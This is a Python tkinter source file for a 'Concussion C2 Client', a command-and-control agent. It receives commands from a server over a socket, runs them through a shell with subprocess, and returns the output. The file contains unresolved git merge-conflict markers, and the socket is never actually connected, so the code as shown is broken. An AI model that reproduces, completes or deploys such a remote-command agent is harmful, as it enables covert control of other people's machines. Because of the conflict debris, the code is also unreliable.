import tkinter as tk
import socket
import threading
import subprocess

# Create the main application window
root = tk.Tk()
root.title("Concussion C2 Client")
root.geometry("700x500")

# Define the common color scheme
root.configure(bg="#000046")

# Create a socket for the client
client_socket = None  # Initialize the client socket

# Function to update the response label
def update_response(message):
    response_label.config(text=message)

# Function to handle commands from the server
def handle_command(command):
    try:
        result = execute_command(command)
        update_response(result)

        # Send the result back to the server
        send_response_to_server(result)

    except Exception as e:
        update_response(f"Error: {e}")

def execute_command(command):
    try:
        # Use subprocess to run the command with administrative privileges
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output, error = process.communicate()

<<<<<<< HEAD
        response_data = client_socket.recv(1024).decode('utf-8')
        response_label.config(text=response_data)

        client_socket.close()

        # Update connection status when successfully connected
        update_connection_status("Connected to Server")
=======
        # Check if the command was successful
        if process.returncode == 0:
            return f"Command executed successfully:\n\n{output.decode('utf-8')}"
        else:
            return f"Command failed with error:\n\n{error.decode('utf-8')}"
>>>>>>> b159a6c (fixed display)

    except Exception as e:
        return f"Error: {e}"

def send_response_to_server(response):
    try:
        if client_socket is not None:
            # Send the response to the server
            client_socket.send(response.encode('utf-8'))

    except Exception as e:
        update_response(f"Error sending response to server: {e}")

# Function to listen for commands from the server
def listen_for_commands():
    try:
        while True:
            if client_socket is not None:
                command = client_socket.recv(1024).decode('utf-8')
                if not command:
                    break

                handle_command(command)

    except Exception as e:
        update_response(f"Error: {e}")

# Labels and Heading (unchanged)
main_heading = tk.Label(root, text="Concussion C2 Client", font=("Helvetica", 16, "bold"), bg="#000046", fg="#00C8FF")
main_heading.pack(pady=(20, 10))

status_label = tk.Label(root, text="Connection Status: Not Connected", font=("Helvetica", 16, "bold"), bg="#000046", fg="#41E67B")
status_label.pack(padx=10, pady=10)

response_label = tk.Label(root, text="", font=("Helvetica", 14), bg="#000046", fg="#00C8FF")
response_label.pack(padx=10, pady=10)

# Start listening for commands in a separate thread
command_listener_thread = threading.Thread(target=listen_for_commands)
command_listener_thread.start()

# Run the GUI application
root.mainloop()
